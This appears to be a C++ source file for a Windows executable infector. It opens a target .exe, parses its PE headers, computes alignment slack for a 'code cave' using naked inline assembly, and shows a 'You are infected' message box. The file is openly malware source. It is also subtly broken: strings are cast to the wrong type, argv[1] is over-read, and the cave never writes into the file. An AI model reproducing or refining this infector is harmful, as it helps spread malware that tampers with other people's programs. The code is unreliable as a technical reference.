#include <iostream>
#include <stdio.h>
#include <Windows.h>
#include <WinUser.h>

using namespace std;

__declspec(naked) void code_cave(DWORD start_pt, DWORD difference_between_iohs, DWORD message) {
    //assembly code to build up the cave
    __asm {
        pop start_pt
        MOV message, EDX
        PUSHAD
        PUSHFD
    }

    //plug the message box here
    cout << message << endl;

    //have the registers restored
    _asm {
        POPFD
        POPAD
        CMP EDX, 0x00001600
        push start_pt
        ret
    }
}

DWORD message_box()
{
    int msg = MessageBox(NULL, (LPCWSTR)"You are infected", (LPCWSTR)"Warning", MB_OK);
    return (DWORD)msg;
}

void shell_creation(PIMAGE_NT_HEADERS nt_headers, DWORD message) {
    //get the difference between fileAlignment and sectionAlignment
    DWORD start_pt = (DWORD)(nt_headers->OptionalHeader.FileAlignment);
    DWORD difference_btw_iohs = ((DWORD)nt_headers->OptionalHeader.SectionAlignment - (DWORD)nt_headers->OptionalHeader.FileAlignment);

    //create and utilise the code cave
    code_cave(start_pt, difference_btw_iohs, message);
}

int main(int argc, char* argv[])
{
    //file uploading
    const int MAX_FILEPATH = 255;
    char file_name[MAX_FILEPATH] = { "C:/benign/benign/00eea85752664955047caad7d6280bc7bf1ab91c61eb9a2542c26b747a12e963.exe" };
    memcpy_s(&file_name, MAX_FILEPATH, argv[1], MAX_FILEPATH);

    //variables initiating
    HANDLE file = NULL;
    DWORD file_size = NULL;
    DWORD bytes_read = NULL;
    LPVOID file_data = NULL;
    DWORD message = NULL;
    PIMAGE_DOS_HEADER dos_header = {};
    PIMAGE_NT_HEADERS image_nt_headers = {};


    //file open
    file = CreateFileA(file_name, GENERIC_ALL, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (file == INVALID_HANDLE_VALUE) {
        cout << "Couldn't read file!";
        return 1;
    }

    //heap allocation
    file_size = GetFileSize(file, NULL);
    file_data = HeapAlloc(GetProcessHeap(), 0, file_size);

    //read file bytes to memory
    bool flag = ReadFile(file, file_data, file_size, &bytes_read, NULL);
    if (flag == false) return -1;

    // get the necessary headers
    dos_header = (PIMAGE_DOS_HEADER)file_data;
    image_nt_headers = (PIMAGE_NT_HEADERS)((DWORD_PTR)file_data + dos_header->e_lfanew);

    //implement the shell creator
    message = message_box();
    shell_creation(image_nt_headers, message);

    return 0;
}

  